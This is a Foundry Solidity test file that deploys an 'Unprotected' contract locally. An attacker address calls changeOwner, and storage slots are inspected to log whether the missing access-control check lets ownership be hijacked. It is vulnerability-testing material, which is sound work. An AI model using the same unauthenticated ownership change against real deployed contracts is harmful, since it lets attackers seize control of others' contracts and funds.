// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/unprotected0.sol";

contract UnprotectedTest is Test {
    Unprotected unprotected;
    address owner = address(0x1);
    address attacker = address(0x2);
    address newOwner = address(0x3);

    // Helper to read storage slot
    function readSlotAddress(address _contract, uint256 slot) public view returns (address) {
        return address(uint160(uint256(vm.load(_contract, bytes32(slot)))));
    }

    function readSlotUint(address _contract, uint256 slot) public view returns (uint256) {
        return uint256(vm.load(_contract, bytes32(slot)));
    }

    // Calculate mapping slot position
    function getMappingUint(address _contract, uint256 mappingSlot, address key) public view returns (uint256) {
        bytes32 slot = keccak256(abi.encode(key, mappingSlot));
        return uint256(vm.load(_contract, slot));
    }

    function setUp() public {
        vm.prank(owner);
        unprotected = new Unprotected();
    }

    function testOwnerChangeVulnerability() public {
        // Storage slot positions (assumed)
        uint256 ownerSlot = 0;
        uint256 totalChangesSlot = 1;
        uint256 mappingSlot = 2; // Slot for the mapping

        console.log("--- BEFORE-Trigger State ---");
        address currentOwnerBefore = readSlotAddress(address(unprotected), ownerSlot);
        uint256 totalChangesBefore = readSlotUint(address(unprotected), totalChangesSlot);
        uint256 changesByNewOwnerBefore = getMappingUint(address(unprotected), mappingSlot, newOwner);
        
        console.log("Current Owner Before:", currentOwnerBefore);
        console.log("Total Ownership Changes Before:", totalChangesBefore);
        console.log("New Owner Changes Before:", changesByNewOwnerBefore);

        console.log("--- Trigger ChangeOwner (by attacker) ---");
        vm.prank(attacker);
        unprotected.changeOwner(newOwner);

        console.log("--- AFTER-Trigger State ---");
        address currentOwnerAfter = readSlotAddress(address(unprotected), ownerSlot);
        uint256 totalChangesAfter = readSlotUint(address(unprotected), totalChangesSlot);
        uint256 changesByNewOwnerAfter = getMappingUint(address(unprotected), mappingSlot, newOwner);
        
        console.log("Current Owner After:", currentOwnerAfter);
        console.log("Total Ownership Changes After:", totalChangesAfter);
        console.log("New Owner Changes After:", changesByNewOwnerAfter);

        // Comparison and verdict
        bool ownerChanged = (currentOwnerAfter == newOwner) && (currentOwnerBefore == owner);
        bool changesIncreased = (totalChangesAfter == totalChangesBefore + 1);
        bool newOwnerChangesIncreased = (changesByNewOwnerAfter == changesByNewOwnerBefore + 1);

        console.log("Owner Changed:", ownerChanged ? "YES" : "NO");
        console.log("Total Changes Increased:", changesIncreased ? "YES" : "NO");
        console.log("New Owner Count Increased:", newOwnerChangesIncreased ? "YES" : "NO");

        // Final verdict
        if (ownerChanged && changesIncreased && newOwnerChangesIncreased) {
            console.log("Vulnerability Exists: Attacker modified owner state and counters through unprotected function");
        } else {
            console.log("Vulnerability not Exist: State variables unchanged after attack");
        }

        // Original access control verification
        vm.prank(newOwner);
        unprotected.recordOwnershipActivity(); // Should succeed

        vm.prank(owner);
        vm.expectRevert();
        unprotected.recordOwnershipActivity(); // Should revert
    }

    function testOwnerChangeByOwner() public {
        // Current owner changes to new owner
        vm.prank(owner);
        unprotected.changeOwner(newOwner);

        // Verify owner was changed by checking owner-only function access
        vm.prank(newOwner);
        unprotected.recordOwnershipActivity();

        // Verify original owner can no longer call owner-only functions
        vm.prank(owner);
        vm.expectRevert();
        unprotected.recordOwnershipActivity();
    }
}